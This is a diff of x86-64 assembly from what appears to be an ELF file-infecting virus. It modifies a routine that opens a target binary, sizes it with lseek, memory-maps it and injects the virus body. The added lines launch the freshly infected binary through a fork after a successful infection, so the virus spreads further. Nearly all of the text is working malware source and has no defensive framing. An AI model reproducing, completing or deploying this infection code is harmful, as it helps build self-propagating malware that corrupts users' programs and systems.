@@ -4,18 +4,23 @@ section .text
 	extern _update_mmaped_file
 	extern _string
 	extern _ft_strlen
+	extern _thread_create
 
 _file_size:
 	enter 24, 0
+; lseek to start of file
 	xor rax, rax
 	mov rax, 8
 	mov rsi, 0
 	mov rdx, 0
 	syscall
+; lseek to end of file
 	mov rax, 8
 	mov rsi, 0
 	mov rdx, 2
 	syscall
+; store the return value, it's the offset of EOF. So it's the file size
+; lseek to start of file again
 	mov QWORD [rsp], rax
 	mov rax, 8
 	mov rsi, 0
@@ -25,43 +30,48 @@ _file_size:
 	leave
 	ret
 
-_treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *full_path (rdx))
-	enter 120, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
-				; rsp + 0 bytes for fd
-				; rsp + 8 bytes for virus size
-				; rsp + 16 bytes for file size
-				; rsp + 24 bytes for mmap return address
-				; rsp + 32 phdr
-				; rsp + 40 actual phnum
-				; rsp + 48 ehdr->e_phnum
-				; rsp + 56 supposed string of file
-				; rsp + 64 name addr
-				; rsp + 72 full_path addr
-				; rsp + 80 name len
-				; rsp + 88 full_path len
-				; rsp + 96 total len
+_treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *full_path (rdx), bool fork (r10))
+	enter 136, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
+	; rsp + 0 bytes for fd
+	; rsp + 8 bytes for virus size
+	; rsp + 16 bytes for file size
+	; rsp + 24 bytes for mmap return address
+	; rsp + 32 phdr
+	; rsp + 40 actual phnum
+	; rsp + 48 ehdr->e_phnum
+	; rsp + 56 supposed string of file
+	; rsp + 64 name addr
+	; rsp + 72 full_path addr
+	; rsp + 80 name len
+	; rsp + 88 full_path len
+	; rsp + 96 total len
+	; rsp + 104 end jmp addr
+	; rsp + 112 bool, fork or not
 ; check if name != NULL
 	cmp rdi, 0
-	je _final_end
-; save virus_size
-	mov QWORD [rsp + 8], rsi
-	mov QWORD [rsp + 64], rdi
-	mov QWORD [rsp + 72], rdx
+	je _not_ok_end
+; save parameters
+	mov QWORD [rsp + 112], r10 ; fork bool
+	mov QWORD [rsp + 8], rsi ; virus_size
+	mov QWORD [rsp + 64], rdi ; name
+	mov QWORD [rsp + 72], rdx ; full_path
+
+; take len of arguments
 	mov rdi, QWORD [rsp + 64]
-_lab_strlen_1:
 	call _ft_strlen
 	mov QWORD [rsp + 80], rax
 	mov rdi, QWORD [rsp + 72]
-_lab_strlen_2:
 	call _ft_strlen
 	mov QWORD [rsp + 88], rax
+
+; calcul total len
 	mov r10, rsp
-	add r10, 96
-	mov r11, QWORD [rsp + 80]
-	mov QWORD [r10], r11
-	mov r11, QWORD [rsp + 88]
-	add QWORD [r10], r11
-	add QWORD [r10], 2
+	add r10, 96 ; total len addr on stack
+	mov r11, QWORD [rsp + 80] ; take first len
+	mov QWORD [r10], r11 ; mov it to our variable
+	mov r11, QWORD [rsp + 88] ; take second len
+	add QWORD [r10], r11 ; add it to our variable
+	add QWORD [r10], 2 ; add 2 for the / and \0
 ; path
 	mov rdi, rsp
 	sub rdi, QWORD [rsp + 96]
@@ -90,23 +100,30 @@ _lab_strlen_2:
 ; open file
 	mov rdi, rsp
 	sub rdi, QWORD [rsp + 96]
-_lab_test:
 	mov rax, 2
 	mov rsi, 2
 	xor rdx, rdx
-	mov r10, QWORD [rsp + 96]
-	sub rsp, r10
-	sub rsp, 8
-	mov QWORD [rsp], r10
-	add QWORD [rsp], 8
+		mov r10, QWORD [rsp + 96]
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
 	syscall
-	add rsp, QWORD [rsp]
+		add rsp, QWORD [rsp]
 	cmp rax, -1
-	jle _final_end
+	jle _not_ok_end
 	mov QWORD [rsp], rax ; store the fd
 	mov rdi, rax
+		mov r10, QWORD [rsp + 96]
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
 	call _file_size
+		add rsp, QWORD [rsp]
 	mov QWORD [rsp + 16], rax ; store file size
+	lea r10, [rel _not_ok_end]
+	mov QWORD [rsp + 104], r10
 	cmp rax, 64
 	jl _close_file
 	
@@ -228,13 +245,15 @@ _call_mmaped_update:
 	mov rsi, QWORD [rsp + 16] ; file size
 	mov rdx, QWORD [rsp + 8] ; virus size
 	mov r10, QWORD [rsp] ; fd
-	mov r11, QWORD [rsp + 96]
-	sub rsp, r11
-	sub rsp, 8
-	mov QWORD [rsp], r11
-	add QWORD [rsp], 8
+		mov r11, QWORD [rsp + 96]
+		sub rsp, r11
+		sub rsp, 8
+		mov QWORD [rsp], r11
+		add QWORD [rsp], 8
 	call _update_mmaped_file
-	add rsp, QWORD [rsp]
+		add rsp, QWORD [rsp]
+	lea rax, [rel _ok_end]
+	mov QWORD [rsp + 104], rax
 
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; munmap
@@ -249,6 +268,29 @@ _close_file:
 	mov rax, 3
 	mov rdi, QWORD [rsp]
 	syscall
+	mov rax, QWORD [rsp + 104]
+	jmp rax
+
+; Here we need we successfully infected the binary, so we will check if we need to run him or not
+_ok_end:
+	cmp QWORD [rsp + 112], 1 ; check if fork mode is activated
+	jne _not_ok_end ; if not, we return.
+	mov r10, QWORD [rsp + 96] ; take total len
+	mov rdi, QWORD [rsp + 64] ; take name addr
+	mov rsi, QWORD [rsp + 72] ; take full path addr
+	mov rdx, rsp
+		sub rdx, r10 ; take full concatened path addr
+		sub rsp, r10
+		sub rsp, 8
+		mov QWORD [rsp], r10
+		add QWORD [rsp], 8
+	call _thread_create ; fork to exec this infected binary
+		add rsp, QWORD [rsp]
+	mov rax, 1
+	jmp _final_end
+
+_not_ok_end:
+	mov rax, 0
 
 _final_end:
 	leave
